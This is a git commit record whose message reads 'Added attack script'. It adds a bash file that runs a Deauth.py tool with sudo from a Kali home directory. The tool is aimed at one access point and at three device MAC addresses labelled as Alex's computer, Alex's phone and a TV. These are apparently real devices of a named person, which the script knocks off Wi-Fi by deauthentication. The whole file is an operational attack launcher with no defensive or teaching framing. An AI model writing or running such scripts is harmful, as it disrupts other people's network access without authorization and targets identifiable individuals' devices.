ef135c9d7184c31634a34887c55ba54b73323c23
Ian Chen <chenian317@gmail.com>
2022-01-15 14:58:35 +0000

    Added attack script

---
+++ script.sh
@@ -0,0 +1,9 @@
+#!/usr/bin/bash
+#Alex compu
+sudo python3 /home/kali/Deauth/Deauth.py 00:70:C2:7A:44:85 C4:3A:35:88:5B:22 wlan1
+
+#Alex celu
+sudo python3 /home/kali/Deauth/Deauth.py 00:70:C2:7A:44:85 88:B4:A6:3C:13:E7 wlan1
+
+#Tele
+sudo python3 /home/kali/Deauth/Deauth.py 00:70:C2:7A:44:85 3C:8D:20:3F:52:03
